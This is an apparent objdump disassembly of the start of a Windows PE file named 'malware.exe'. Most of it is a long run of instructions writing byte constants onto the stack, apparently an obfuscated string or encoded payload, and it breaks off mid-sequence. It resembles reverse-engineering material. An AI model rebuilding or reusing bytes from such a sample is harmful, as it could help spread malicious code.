
malware.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	b8 6d 07 42 00       	mov    eax,0x42076d
  401005:	e8 22 e2 01 00       	call   0x41f22c
  40100a:	81 ec dc 02 00 00    	sub    esp,0x2dc
  401010:	53                   	push   ebx
  401011:	56                   	push   esi
  401012:	57                   	push   edi
  401013:	89 65 f0             	mov    DWORD PTR [ebp-0x10],esp
  401016:	c6 85 1c fd ff ff 51 	mov    BYTE PTR [ebp-0x2e4],0x51
  40101d:	c6 85 1d fd ff ff 01 	mov    BYTE PTR [ebp-0x2e3],0x1
  401024:	c6 85 1e fd ff ff 75 	mov    BYTE PTR [ebp-0x2e2],0x75
  40102b:	c6 85 1f fd ff ff 0b 	mov    BYTE PTR [ebp-0x2e1],0xb
  401032:	c6 85 20 fd ff ff 9e 	mov    BYTE PTR [ebp-0x2e0],0x9e
  401039:	c6 85 21 fd ff ff 2a 	mov    BYTE PTR [ebp-0x2df],0x2a
  401040:	c6 85 22 fd ff ff 81 	mov    BYTE PTR [ebp-0x2de],0x81
  401047:	c6 85 23 fd ff ff 76 	mov    BYTE PTR [ebp-0x2dd],0x76
  40104e:	c6 85 24 fd ff ff 14 	mov    BYTE PTR [ebp-0x2dc],0x14
  401055:	c6 85 25 fd ff ff 5d 	mov    BYTE PTR [ebp-0x2db],0x5d
  40105c:	c6 85 26 fd ff ff 46 	mov    BYTE PTR [ebp-0x2da],0x46
  401063:	c6 85 27 fd ff ff e9 	mov    BYTE PTR [ebp-0x2d9],0xe9
  40106a:	c6 85 28 fd ff ff 34 	mov    BYTE PTR [ebp-0x2d8],0x34
  401071:	c6 85 29 fd ff ff 0d 	mov    BYTE PTR [ebp-0x2d7],0xd
  401078:	c6 85 2a fd ff ff 49 	mov    BYTE PTR [ebp-0x2d6],0x49
  40107f:	c6 85 2b fd ff ff 48 	mov    BYTE PTR [ebp-0x2d5],0x48
  401086:	c6 85 2c fd ff ff bb 	mov    BYTE PTR [ebp-0x2d4],0xbb
  40108d:	c6 85 2d fd ff ff 5a 	mov    BYTE PTR [ebp-0x2d3],0x5a
  401094:	c6 85 2e fd ff ff 3a 	mov    BYTE PTR [ebp-0x2d2],0x3a
  40109b:	c6 85 2f fd ff ff e2 	mov    BYTE PTR [ebp-0x2d1],0xe2
  4010a2:	c6 85 30 fd ff ff c1 	mov    BYTE PTR [ebp-0x2d0],0xc1
  4010a9:	c6 85 31 fd ff ff 65 	mov    BYTE PTR [ebp-0x2cf],0x65
  4010b0:	c6 85 32 fd ff ff 8f 	mov    BYTE PTR [ebp-0x2ce],0x8f
  4010b7:	c6 85 33 fd ff ff aa 	mov    BYTE PTR [ebp-0x2cd],0xaa
  4010be:	c6 85 34 fd ff ff 59 	mov    BYTE PTR [ebp-0x2cc],0x59
  4010c5:	c6 85 35 fd ff ff 58 	mov    BYTE PTR [ebp-0x2cb],0x58
  4010cc:	c6 85 36 fd ff ff b9 	mov    BYTE PTR [ebp-0x2ca],0xb9
  4010d3:	c6 85 37 fd ff ff 7a 	mov    BYTE PTR [ebp-0x2c9],0x7a
  4010da:	c6 85 38 fd ff ff 5d 	mov    BYTE PTR [ebp-0x2c8],0x5d
  4010e1:	c6 85 39 fd ff ff b4 	mov    BYTE PTR [ebp-0x2c7],0xb4
  4010e8:	c6 85 3a fd ff ff 6a 	mov    BYTE PTR [ebp-0x2c6],0x6a
  4010ef:	c6 85 3b fd ff ff 9e 	mov    BYTE PTR [ebp-0x2c5],0x9e
  4010f6:	c6 85 3c fd ff ff 25 	mov    BYTE PTR [ebp-0x2c4],0x25
  4010fd:	c6 85 3d fd ff ff 12 	mov    BYTE PTR [ebp-0x2c3],0x12
  401104:	c6 85 3e fd ff ff 8e 	mov    BYTE PTR [ebp-0x2c2],0x8e
  40110b:	c6 85 3f fd ff ff 93 	mov    BYTE PTR [ebp-0x2c1],0x93
  401112:	c6 85 40 fd ff ff 09 	mov    BYTE PTR [ebp-0x2c0],0x9
  401119:	c6 85 41 fd ff ff 4a 	mov    BYTE PTR [ebp-0x2bf],0x4a
  401120:	c6 85 42 fd ff ff 54 	mov    BYTE PTR [ebp-0x2be],0x54
  401127:	c6 85 43 fd ff ff 9c 	mov    BYTE PTR [ebp-0x2bd],0x9c
  40112e:	c6 85 44 fd ff ff 89 	mov    BYTE PTR [ebp-0x2bc],0x89
  401135:	c6 85 45 fd ff ff 2b 	mov    BYTE PTR [ebp-0x2bb],0x2b
  40113c:	c6 85 46 fd ff ff 59 	mov    BYTE PTR [ebp-0x2ba],0x59
  401143:	c6 85 47 fd ff ff 24 	mov    BYTE PTR [ebp-0x2b9],0x24
  40114a:	c6 85 48 fd ff ff 93 	mov    BYTE PTR [ebp-0x2b8],0x93
  401151:	c6 85 49 fd ff ff 54 	mov    BYTE PTR [ebp-0x2b7],0x54
  401158:	c6 85 4a fd ff ff 9d 	mov    BYTE PTR [ebp-0x2b6],0x9d
  40115f:	c6 85 4b fd ff ff 16 	mov    BYTE PTR [ebp-0x2b5],0x16
  401166:	c6 85 4c fd ff ff 8f 	mov    BYTE PTR [ebp-0x2b4],0x8f
  40116d:	c6 85 4d fd ff ff af 	mov    BYTE PTR [ebp-0x2b3],0xaf
  401174:	c6 85 4e fd ff ff 49 	mov    BYTE PTR [ebp-0x2b2],0x49
  40117b:	c6 85 4f fd ff ff a1 	mov    BYTE PTR [ebp-0x2b1],0xa1
  401182:	c6 85 50 fd ff ff 54 	mov    BYTE PTR [ebp-0x2b0],0x54
  401189:	c6 85 51 fd ff ff 49 	mov    BYTE PTR [ebp-0x2af],0x49
  401190:	c6 85 52 fd ff ff 2b 	mov    BYTE PTR [ebp-0x2ae],0x2b
  401197:	c6 85 53 fd ff ff 7a 	mov    BYTE PTR [ebp-0x2ad],0x7a
  40119e:	c6 85 54 fd ff ff 11 	mov    BYTE PTR [ebp-0x2ac],0x11
  4011a5:	c6 85 55 fd ff ff 38 	mov    BYTE PTR [ebp-0x2ab],0x38
  4011ac:	c6 85 56 fd ff ff 9c 	mov    BYTE PTR [ebp-0x2aa],0x9c
  4011b3:	c6 85 57 fd ff ff ad 	mov    BYTE PTR [ebp-0x2a9],0xad
  4011ba:	c6 85 58 fd ff ff 08 	mov    BYTE PTR [ebp-0x2a8],0x8
  4011c1:	c6 85 59 fd ff ff c8 	mov    BYTE PTR [ebp-0x2a7],0xc8
  4011c8:	c6 85 5a fd ff ff 3a 	mov    BYTE PTR [ebp-0x2a6],0x3a
  4011cf:	c6 85 5b fd ff ff 52 	mov    BYTE PTR [ebp-0x2a5],0x52
  4011d6:	c6 85 5c fd ff ff 86 	mov    BYTE PTR [ebp-0x2a4],0x86
  4011dd:	c6 85 5d fd ff ff 59 	mov    BYTE PTR [ebp-0x2a3],0x59
  4011e4:	c6 85 5e fd ff ff 09 	mov    BYTE PTR [ebp-0x2a2],0x9
  4011eb:	c6 85 5f fd ff ff 47 	mov    BYTE PTR [ebp-0x2a1],0x47
  4011f2:	c6 85 60 fd ff ff d4 	mov    BYTE PTR [ebp-0x2a0],0xd4
  4011f9:	c6 85 61 fd ff ff 33 	mov    BYTE PTR [ebp-0x29f],0x33
  401200:	c6 85 62 fd ff ff d1 	mov    BYTE PTR [ebp-0x29e],0xd1
  401207:	c6 85 63 fd ff ff e4 	mov    BYTE PTR [ebp-0x29d],0xe4
  40120e:	c6 85 64 fd ff ff d1 	mov    BYTE PTR [ebp-0x29c],0xd1
  401215:	c6 85 65 fd ff ff 85 	mov    BYTE PTR [ebp-0x29b],0x85
  40121c:	c6 85 66 fd ff ff 69 	mov    BYTE PTR [ebp-0x29a],0x69
  401223:	c6 85 67 fd ff ff 97 	mov    BYTE PTR [ebp-0x299],0x97
  40122a:	c6 85 68 fd ff ff 9c 	mov    BYTE PTR [ebp-0x298],0x9c
  401231:	c6 85 69 fd ff ff 1f 	mov    BYTE PTR [ebp-0x297],0x1f
  401238:	c6 85 6a fd ff ff 26 	mov    BYTE PTR [ebp-0x296],0x26
  40123f:	c6 85 6b fd ff ff 3b 	mov    BYTE PTR [ebp-0x295],0x3b
  401246:	c6 85 6c fd ff ff 61 	mov    BYTE PTR [ebp-0x294],0x61
  40124d:	c6 85 6d fd ff ff 41 	mov    BYTE PTR [ebp-0x293],0x41
  401254:	c6 85 6e fd ff ff 74 	mov    BYTE PTR [ebp-0x292],0x74
  40125b:	c6 85 6f fd ff ff d5 	mov    BYTE PTR [ebp-0x291],0xd5
  401262:	c6 85 70 fd ff ff 59 	mov    BYTE PTR [ebp-0x290],0x59
  401269:	c6 85 71 fd ff ff d1 	mov    BYTE PTR [ebp-0x28f],0xd1
  401270:	c6 85 72 fd ff ff d9 	mov    BYTE PTR [ebp-0x28e],0xd9
  401277:	c6 85 73 fd ff ff a5 	mov    BYTE PTR [ebp-0x28d],0xa5
  40127e:	c6 85 74 fd ff ff 87 	mov    BYTE PTR [ebp-0x28c],0x87
  401285:	c6 85 75 fd ff ff a5 	mov    BYTE PTR [ebp-0x28b],0xa5
  40128c:	c6 85 76 fd ff ff 17 	mov    BYTE PTR [ebp-0x28a],0x17
  401293:	c6 85 77 fd ff ff 3c 	mov    BYTE PTR [ebp-0x289],0x3c
  40129a:	c6 85 78 fd ff ff 8f 	mov    BYTE PTR [ebp-0x288],0x8f
  4012a1:	c6 85 79 fd ff ff 0b 	mov    BYTE PTR [ebp-0x287],0xb
  4012a8:	c6 85 7a fd ff ff ea 	mov    BYTE PTR [ebp-0x286],0xea
  4012af:	c6 85 7b fd ff ff 0f 	mov    BYTE PTR [ebp-0x285],0xf
  4012b6:	c6 85 7c fd ff ff 93 	mov    BYTE PTR [ebp-0x284],0x93
  4012bd:	c6 85 7d fd ff ff 24 	mov    BYTE PTR [ebp-0x283],0x24
  4012c4:	c6 85 7e fd ff ff 36 	mov    BYTE PTR [ebp-0x282],0x36
  4012cb:	c6 85 7f fd ff ff a3 	mov    BYTE PTR [ebp-0x281],0xa3
  4012d2:	c6 85 80 fd ff ff 71 	mov    BYTE PTR [ebp-0x280],0x71
  4012d9:	c6 85 81 fd ff ff 36 	mov    BYTE PTR [ebp-0x27f],0x36
  4012e0:	c6 85 82 fd ff ff c3 	mov    BYTE PTR [ebp-0x27e],0xc3
  4012e7:	c6 85 83 fd ff ff ee 	mov    BYTE PTR [ebp-0x27d],0xee
  4012ee:	c6 85 84 fd ff ff 9d 	mov    BYTE PTR [ebp-0x27c],0x9d
  4012f5:	c6 85 85 fd ff ff 1f 	mov    BYTE PTR [ebp-0x27b],0x1f
  4012fc:	c6 85 86 fd ff ff 66 	mov    BYTE PTR [ebp-0x27a],0x66
  401303:	c6 85 87 fd ff ff c0 	mov    BYTE PTR [ebp-0x279],0xc0
  40130a:	c6 85 88 fd ff ff 7d 	mov    BYTE PTR [ebp-0x278],0x7d
  401311:	c6 85 89 fd ff ff 68 	mov    BYTE PTR [ebp-0x277],0x68
  401318:	c6 85 8a fd ff ff 5d 	mov    BYTE PTR [ebp-0x276],0x5d
  40131f:	c6 85 8b fd ff ff 9b 	mov    BYTE PTR [ebp-0x275],0x9b
  401326:	c6 85 8c fd ff ff e7 	mov    BYTE PTR [ebp-0x274],0xe7
  40132d:	c6 85 8d fd ff ff e5 	mov    BYTE PTR [ebp-0x273],0xe5
  401334:	c6 85 8e fd ff ff a6 	mov    BYTE PTR [ebp-0x272],0xa6
  40133b:	c6 85 8f fd ff ff bd 	mov    BYTE PTR [ebp-0x271],0xbd
  401342:	c6 85 90 fd ff ff 57 	mov    BYTE PTR [ebp-0x270],0x57
  401349:	c6 85 91 fd ff ff 66 	mov    BYTE PTR [ebp-0x26f],0x66
  401350:	c6 85 92 fd ff ff 59 	mov    BYTE PTR [ebp-0x26e],0x59
  401357:	c6 85 93 fd ff ff 76 	mov    BYTE PTR [ebp-0x26d],0x76
  40135e:	c6 85 94 fd ff ff 66 	mov    BYTE PTR [ebp-0x26c],0x66
  401365:	c6 85 95 fd ff ff 6f 	mov    BYTE PTR [ebp-0x26b],0x6f
  40136c:	c6 85 96 fd ff ff 56 	mov    BYTE PTR [ebp-0x26a],0x56
  401373:	c6 85 97 fd ff ff 5d 	mov    BYTE PTR [ebp-0x269],0x5d
  40137a:	c6 85 98 fd ff ff ad 	mov    BYTE PTR [ebp-0x268],0xad
  401381:	c6 85 99 fd ff ff 36 	mov    BYTE PTR [ebp-0x267],0x36
  401388:	c6 85 9a fd ff ff 27 	mov    BYTE PTR [ebp-0x266],0x27
  40138f:	c6 85 9b fd ff ff ab 	mov    BYTE PTR [ebp-0x265],0xab
  401396:	c6 85 9c fd ff ff 16 	mov    BYTE PTR [ebp-0x264],0x16
  40139d:	c6 85 9d fd ff ff bb 	mov    BYTE PTR [ebp-0x263],0xbb
  4013a4:	c6 85 9e fd ff ff b4 	mov    BYTE PTR [ebp-0x262],0xb4
  4013ab:	c6 85 9f fd ff ff bd 	mov    BYTE PTR [ebp-0x261],0xbd
  4013b2:	c6 85 a0 fd ff ff 3e 	mov    BYTE PTR [ebp-0x260],0x3e
  4013b9:	c6 85 a1 fd ff ff f4 	mov    BYTE PTR [ebp-0x25f],0xf4
  4013c0:	c6 85 a2 fd ff ff f8 	mov    BYTE PTR [ebp-0x25e],0xf8
  4013c7:	c6 85 a3 fd ff ff 3e 	mov    BYTE PTR [ebp-0x25d],0x3e
  4013ce:	c6 85 a4 fd ff ff 9f 	mov    BYTE PTR [ebp-0x25c],0x9f
  4013d5:	c6 85 a5 fd ff ff 97 	mov    BYTE PTR [ebp-0x25b],0x97
  4013dc:	c6 85 a6 fd ff ff f6 	mov    BYTE PTR [ebp-0x25a],0xf6
  4013e3:	c6 85 a7 fd ff ff bf 	mov    BYTE PTR [ebp-0x259],0xbf
  4013ea:	c6 85 a8 fd ff ff 2c 	mov    BYTE PTR [ebp-0x258],0x2c
  4013f1:	c6 85 a9 fd ff ff d4 	mov    BYTE PTR [ebp-0x257],0xd4
  4013f8:	c6 85 aa fd ff ff 7d 	mov    BYTE PTR [ebp-0x256],0x7d
  4013ff:	c6 85 ab fd ff ff 9b 	mov    BYTE PTR [ebp-0x255],0x9b
  401406:	c6 85 ac fd ff ff a5 	mov    BYTE PTR [ebp-0x254],0xa5
  40140d:	c6 85 ad fd ff ff 6f 	mov    BYTE PTR [ebp-0x253],0x6f
  401414:	c6 85 ae fd ff ff f4 	mov    BYTE PTR [ebp-0x252],0xf4
  40141b:	c6 85 af fd ff ff 9b 	mov    BYTE PTR [ebp-0x251],0x9b
  401422:	c6 85 b0 fd ff ff 49 	mov    BYTE PTR [ebp-0x250],0x49
  401429:	c6 85 b1 fd ff ff 27 	mov    BYTE PTR [ebp-0x24f],0x27
  401430:	c6 85 b2 fd ff ff 4e 	mov    BYTE PTR [ebp-0x24e],0x4e
  401437:	c6 85 b3 fd ff ff 0c 	mov    BYTE PTR [ebp-0x24d],0xc
  40143e:	33 c9                	xor    ecx,ecx
  401440:	88 8d b4 fd ff ff    	mov    BYTE PTR [ebp-0x24c],cl
  401446:	c6 85 b5 fd ff ff 6d 	mov    BYTE PTR [ebp-0x24b],0x6d
  40144d:	c6 85 b6 fd ff ff a3 	mov    BYTE PTR [ebp-0x24a],0xa3
  401454:	c6 85 b7 fd ff ff 78 	mov    BYTE PTR [ebp-0x249],0x78
  40145b:	c6 85 b8 fd ff ff 3d 	mov    BYTE PTR [ebp-0x248],0x3d
  401462:	c6 85 b9 fd ff ff 31 	mov    BYTE PTR [ebp-0x247],0x31
  401469:	88 8d ba fd ff ff    	mov    BYTE PTR [ebp-0x246],cl
  40146f:	c6 85 bb fd ff ff a6 	mov    BYTE PTR [ebp-0x245],0xa6
  401476:	c6 85 bc fd ff ff dc 	mov    BYTE PTR [ebp-0x244],0xdc
  40147d:	c6 85 bd fd ff ff 57 	mov    BYTE PTR [ebp-0x243],0x57
  401484:	c6 85 be fd ff ff 6a 	mov    BYTE PTR [ebp-0x242],0x6a
  40148b:	c6 85 bf fd ff ff 10 	mov    BYTE PTR [ebp-0x241],0x10
  401492:	c6 85 c0 fd ff ff e0 	mov    BYTE PTR [ebp-0x240],0xe0
  401499:	c6 85 c1 fd ff ff 40 	mov    BYTE PTR [ebp-0x23f],0x40
  4014a0:	c6 85 c2 fd ff ff ae 	mov    BYTE PTR [ebp-0x23e],0xae
  4014a7:	c6 85 c3 fd ff ff 84 	mov    BYTE PTR [ebp-0x23d],0x84
  4014ae:	c6 85 c4 fd ff ff 86 	mov    BYTE PTR [ebp-0x23c],0x86
  4014b5:	c6 85 c5 fd ff ff 92 	mov    BYTE PTR [ebp-0x23b],0x92
  4014bc:	c6 85 c6 fd ff ff 8e 	mov    BYTE PTR [ebp-0x23a],0x8e
  4014c3:	c6 85 c7 fd ff ff 3a 	mov    BYTE PTR [ebp-0x239],0x3a
  4014ca:	c6 85 c8 fd ff ff b0 	mov    BYTE PTR [ebp-0x238],0xb0
  4014d1:	c6 85 c9 fd ff ff c4 	mov    BYTE PTR [ebp-0x237],0xc4
  4014d8:	c6 85 ca fd ff ff b0 	mov    BYTE PTR [ebp-0x236],0xb0
  4014df:	c6 85 cb fd ff ff da 	mov    BYTE PTR [ebp-0x235],0xda
  4014e6:	c6 85 cc fd ff ff 8c 	mov    BYTE PTR [ebp-0x234],0x8c
  4014ed:	c6 85 cd fd ff ff 3a 	mov    BYTE PTR [ebp-0x233],0x3a
  4014f4:	c6 85 ce fd ff ff 18 	mov    BYTE PTR [ebp-0x232],0x18
  4014fb:	c6 85 cf fd ff ff 20 	mov    BYTE PTR [ebp-0x231],0x20
  401502:	c6 85 d0 fd ff ff 3c 	mov    BYTE PTR [ebp-0x230],0x3c
  401509:	c6 85 d1 fd ff ff d3 	mov    BYTE PTR [ebp-0x22f],0xd3
  401510:	c6 85 d2 fd ff ff 03 	mov    BYTE PTR [ebp-0x22e],0x3
  401517:	c6 85 d3 fd ff ff 02 	mov    BYTE PTR [ebp-0x22d],0x2
  40151e:	c6 85 d4 fd ff ff ed 	mov    BYTE PTR [ebp-0x22c],0xed
  401525:	c6 85 d5 fd ff ff 9f 	mov    BYTE PTR [ebp-0x22b],0x9f
  40152c:	c6 85 d6 fd ff ff 2f 	mov    BYTE PTR [ebp-0x22a],0x2f
  401533:	c6 85 d7 fd ff ff 95 	mov    BYTE PTR [ebp-0x229],0x95
  40153a:	c6 85 d8 fd ff ff 0d 	mov    BYTE PTR [ebp-0x228],0xd
  401541:	c6 85 d9 fd ff ff ef 	mov    BYTE PTR [ebp-0x227],0xef
  401548:	c6 85 da fd ff ff 0a 	mov    BYTE PTR [ebp-0x226],0xa
  40154f:	c6 85 db fd ff ff 7c 	mov    BYTE PTR [ebp-0x225],0x7c
  401556:	c6 85 dc fd ff ff 3a 	mov    BYTE PTR [ebp-0x224],0x3a
  40155d:	c6 85 dd fd ff ff 42 	mov    BYTE PTR [ebp-0x223],0x42
  401564:	c6 85 de fd ff ff dc 	mov    BYTE PTR [ebp-0x222],0xdc
  40156b:	c6 85 df fd ff ff df 	mov    BYTE PTR [ebp-0x221],0xdf
  401572:	c6 85 e0 fd ff ff ae 	mov    BYTE PTR [ebp-0x220],0xae
  401579:	c6 85 e1 fd ff ff 21 	mov    BYTE PTR [ebp-0x21f],0x21
  401580:	c6 85 e2 fd ff ff b1 	mov    BYTE PTR [ebp-0x21e],0xb1
  401587:	c6 85 e3 fd ff ff a8 	mov    BYTE PTR [ebp-0x21d],0xa8
  40158e:	c6 85 e4 fd ff ff df 	mov    BYTE PTR [ebp-0x21c],0xdf
  401595:	c6 85 e5 fd ff ff b1 	mov    BYTE PTR [ebp-0x21b],0xb1
  40159c:	c6 85 e6 fd ff ff f8 	mov    BYTE PTR [ebp-0x21a],0xf8
  4015a3:	c6 85 e7 fd ff ff 6e 	mov    BYTE PTR [ebp-0x219],0x6e
  4015aa:	c6 85 e8 fd ff ff da 	mov    BYTE PTR [ebp-0x218],0xda
  4015b1:	c6 85 e9 fd ff ff 61 	mov    BYTE PTR [ebp-0x217],0x61
  4015b8:	c6 85 ea fd ff ff 36 	mov    BYTE PTR [ebp-0x216],0x36
  4015bf:	c6 85 eb fd ff ff 30 	mov    BYTE PTR [ebp-0x215],0x30
  4015c6:	c6 85 ec fd ff ff 2b 	mov    BYTE PTR [ebp-0x214],0x2b
  4015cd:	c6 85 ed fd ff ff 60 	mov    BYTE PTR [ebp-0x213],0x60
  4015d4:	c6 85 ee fd ff ff 26 	mov    BYTE PTR [ebp-0x212],0x26
  4015db:	c6 85 ef fd ff ff 0e 	mov    BYTE PTR [ebp-0x211],0xe
  4015e2:	c6 85 f0 fd ff ff df 	mov    BYTE PTR [ebp-0x210],0xdf
  4015e9:	c6 85 f1 fd ff ff 1d 	mov    BYTE PTR [ebp-0x20f],0x1d
  4015f0:	c6 85 f2 fd ff ff c9 	mov    BYTE PTR [ebp-0x20e],0xc9
  4015f7:	c6 85 f3 fd ff ff 0e 	mov    BYTE PTR [ebp-0x20d],0xe
  4015fe:	c6 85 f4 fd ff ff 15 	mov    BYTE PTR [ebp-0x20c],0x15
  401605:	c6 85 f5 fd ff ff 05 	mov    BYTE PTR [ebp-0x20b],0x5
  40160c:	c6 85 f6 fd ff ff 63 	mov    BYTE PTR [ebp-0x20a],0x63
  401613:	c6 85 f7 fd ff ff a1 	mov    BYTE PTR [ebp-0x209],0xa1
  40161a:	c6 85 f8 fd ff ff 21 	mov    BYTE PTR [ebp-0x208],0x21
  401621:	c6 85 f9 fd ff ff 5f 	mov    BYTE PTR [ebp-0x207],0x5f
  401628:	c6 85 fa fd ff ff 8e 	mov    BYTE PTR [ebp-0x206],0x8e
  40162f:	c6 85 fb fd ff ff 48 	mov    BYTE PTR [ebp-0x205],0x48
  401636:	c6 85 fc fd ff ff 07 	mov    BYTE PTR [ebp-0x204],0x7
  40163d:	c6 85 fd fd ff ff 05 	mov    BYTE PTR [ebp-0x203],0x5
  401644:	c6 85 fe fd ff ff d5 	mov    BYTE PTR [ebp-0x202],0xd5
  40164b:	c6 85 ff fd ff ff e5 	mov    BYTE PTR [ebp-0x201],0xe5
  401652:	c6 85 00 fe ff ff e4 	mov    BYTE PTR [ebp-0x200],0xe4
  401659:	c6 85 01 fe ff ff 3b 	mov    BYTE PTR [ebp-0x1ff],0x3b
  401660:	c6 85 02 fe ff ff 21 	mov    BYTE PTR [ebp-0x1fe],0x21
  401667:	c6 85 03 fe ff ff a1 	mov    BYTE PTR [ebp-0x1fd],0xa1
  40166e:	c6 85 04 fe ff ff 2a 	mov    BYTE PTR [ebp-0x1fc],0x2a
  401675:	c6 85 05 fe ff ff 16 	mov    BYTE PTR [ebp-0x1fb],0x16
  40167c:	c6 85 06 fe ff ff 93 	mov    BYTE PTR [ebp-0x1fa],0x93
  401683:	c6 85 07 fe ff ff cb 	mov    BYTE PTR [ebp-0x1f9],0xcb
  40168a:	c6 85 08 fe ff ff 2b 	mov    BYTE PTR [ebp-0x1f8],0x2b
  401691:	c6 85 09 fe ff ff 49 	mov    BYTE PTR [ebp-0x1f7],0x49
  401698:	c6 85 0a fe ff ff e6 	mov    BYTE PTR [ebp-0x1f6],0xe6
  40169f:	c6 85 0b fe ff ff 86 	mov    BYTE PTR [ebp-0x1f5],0x86
  4016a6:	c6 85 0c fe ff ff 64 	mov    BYTE PTR [ebp-0x1f4],0x64
  4016ad:	c6 85 0d fe ff ff 57 	mov    BYTE PTR [ebp-0x1f3],0x57
  4016b4:	c6 85 0e fe ff ff 87 	mov    BYTE PTR [ebp-0x1f2],0x87
  4016bb:	c6 85 0f fe ff ff 52 	mov    BYTE PTR [ebp-0x1f1],0x52
  4016c2:	c6 85 10 fe ff ff 72 	mov    BYTE PTR [ebp-0x1f0],0x72
  4016c9:	c6 85 11 fe ff ff 0b 	mov    BYTE PTR [ebp-0x1ef],0xb
  4016d0:	c6 85 12 fe ff ff b0 	mov    BYTE PTR [ebp-0x1ee],0xb0
  4016d7:	c6 85 13 fe ff ff ac 	mov    BYTE PTR [ebp-0x1ed],0xac
  4016de:	c6 85 14 fe ff ff 56 	mov    BYTE PTR [ebp-0x1ec],0x56
  4016e5:	c6 85 15 fe ff ff a0 	mov    BYTE PTR [ebp-0x1eb],0xa0
  4016ec:	c6 85 16 fe ff ff 8c 	mov    BYTE PTR [ebp-0x1ea],0x8c
  4016f3:	c6 85 17 fe ff ff bd 	mov    BYTE PTR [ebp-0x1e9],0xbd
  4016fa:	c6 85 18 fe ff ff b7 	mov    BYTE PTR [ebp-0x1e8],0xb7
  401701:	c6 85 19 fe ff ff cb 	mov    BYTE PTR [ebp-0x1e7],0xcb
  401708:	c6 85 1a fe ff ff c8 	mov    BYTE PTR [ebp-0x1e6],0xc8
  40170f:	c6 85 1b fe ff ff 69 	mov    BYTE PTR [ebp-0x1e5],0x69
  401716:	c6 85 1c fe ff ff a8 	mov    BYTE PTR [ebp-0x1e4],0xa8
  40171d:	c6 85 1d fe ff ff 53 	mov    BYTE PTR [ebp-0x1e3],0x53
  401724:	c6 85 1e fe ff ff 7c 	mov    BYTE PTR [ebp-0x1e2],0x7c
  40172b:	c6 85 1f fe ff ff ba 	mov    BYTE PTR [ebp-0x1e1],0xba
  401732:	c6 85 20 fe ff ff 7d 	mov    BYTE PTR [ebp-0x1e0],0x7d
  401739:	c6 85 21 fe ff ff 15 	mov    BYTE PTR [ebp-0x1df],0x15
  401740:	c6 85 22 fe ff ff 1f 	mov    BYTE PTR [ebp-0x1de],0x1f
  401747:	c6 85 23 fe ff ff 1f 	mov    BYTE PTR [ebp-0x1dd],0x1f
  40174e:	c6 85 24 fe ff ff 0e 	mov    BYTE PTR [ebp-0x1dc],0xe
  401755:	c6 85 25 fe ff ff 42 	mov    BYTE PTR [ebp-0x1db],0x42
  40175c:	c6 85 26 fe ff ff 85 	mov    BYTE PTR [ebp-0x1da],0x85
  401763:	c6 85 27 fe ff ff e5 	mov    BYTE PTR [ebp-0x1d9],0xe5
  40176a:	c6 85 28 fe ff ff eb 	mov    BYTE PTR [ebp-0x1d8],0xeb
  401771:	c6 85 29 fe ff ff 90 	mov    BYTE PTR [ebp-0x1d7],0x90
  401778:	c6 85 2a fe ff ff 0e 	mov    BYTE PTR [ebp-0x1d6],0xe
  40177f:	c6 85 2b fe ff ff 99 	mov    BYTE PTR [ebp-0x1d5],0x99
  401786:	c6 85 2c fe ff ff 30 	mov    BYTE PTR [ebp-0x1d4],0x30
  40178d:	c6 85 2d fe ff ff 48 	mov    BYTE PTR [ebp-0x1d3],0x48
  401794:	c6 85 2e fe ff ff 48 	mov    BYTE PTR [ebp-0x1d2],0x48
  40179b:	c6 85 2f fe ff ff 64 	mov    BYTE PTR [ebp-0x1d1],0x64
  4017a2:	c6 85 30 fe ff ff e9 	mov    BYTE PTR [ebp-0x1d0],0xe9
  4017a9:	c6 85 31 fe ff ff 11 	mov    BYTE PTR [ebp-0x1cf],0x11
  4017b0:	c6 85 32 fe ff ff 21 	mov    BYTE PTR [ebp-0x1ce],0x21
  4017b7:	c6 85 33 fe ff ff da 	mov    BYTE PTR [ebp-0x1cd],0xda
  4017be:	c6 85 34 fe ff ff 1e 	mov    BYTE PTR [ebp-0x1cc],0x1e
  4017c5:	c6 85 35 fe ff ff 8e 	mov    BYTE PTR [ebp-0x1cb],0x8e
  4017cc:	c6 85 36 fe ff ff 03 	mov    BYTE PTR [ebp-0x1ca],0x3
  4017d3:	c6 85 37 fe ff ff c1 	mov    BYTE PTR [ebp-0x1c9],0xc1
  4017da:	c6 85 38 fe ff ff 51 	mov    BYTE PTR [ebp-0x1c8],0x51
  4017e1:	c6 85 39 fe ff ff 22 	mov    BYTE PTR [ebp-0x1c7],0x22
  4017e8:	c6 85 3a fe ff ff e5 	mov    BYTE PTR [ebp-0x1c6],0xe5
  4017ef:	c6 85 3b fe ff ff ac 	mov    BYTE PTR [ebp-0x1c5],0xac
  4017f6:	c6 85 3c fe ff ff 16 	mov    BYTE PTR [ebp-0x1c4],0x16
  4017fd:	c6 85 3d fe ff ff 95 	mov    BYTE PTR [ebp-0x1c3],0x95
  401804:	c6 85 3e fe ff ff af 	mov    BYTE PTR [ebp-0x1c2],0xaf
  40180b:	c6 85 3f fe ff ff 71 	mov    BYTE PTR [ebp-0x1c1],0x71
  401812:	c6 85 40 fe ff ff b5 	mov    BYTE PTR [ebp-0x1c0],0xb5
  401819:	c6 85 41 fe ff ff ac 	mov    BYTE PTR [ebp-0x1bf],0xac
  401820:	c6 85 42 fe ff ff bd 	mov    BYTE PTR [ebp-0x1be],0xbd
  401827:	c6 85 43 fe ff ff ec 	mov    BYTE PTR [ebp-0x1bd],0xec
  40182e:	c6 85 44 fe ff ff ba 	mov    BYTE PTR [ebp-0x1bc],0xba
  401835:	c6 85 45 fe ff ff 70 	mov    BYTE PTR [ebp-0x1bb],0x70
  40183c:	c6 85 46 fe ff ff 59 	mov    BYTE PTR [ebp-0x1ba],0x59
  401843:	c6 85 47 fe ff ff 42 	mov    BYTE PTR [ebp-0x1b9],0x42
  40184a:	c6 85 48 fe ff ff d3 	mov    BYTE PTR [ebp-0x1b8],0xd3
  401851:	c6 85 49 fe ff ff c3 	mov    BYTE PTR [ebp-0x1b7],0xc3
  401858:	c6 85 4a fe ff ff 83 	mov    BYTE PTR [ebp-0x1b6],0x83
  40185f:	c6 85 4b fe ff ff 4d 	mov    BYTE PTR [ebp-0x1b5],0x4d
  401866:	c6 85 4c fe ff ff 44 	mov    BYTE PTR [ebp-0x1b4],0x44
  40186d:	c6 85 4d fe ff ff b6 	mov    BYTE PTR [ebp-0x1b3],0xb6
  401874:	c6 85 4e fe ff ff 06 	mov    BYTE PTR [ebp-0x1b2],0x6
  40187b:	c6 85 4f fe ff ff 4a 	mov    BYTE PTR [ebp-0x1b1],0x4a
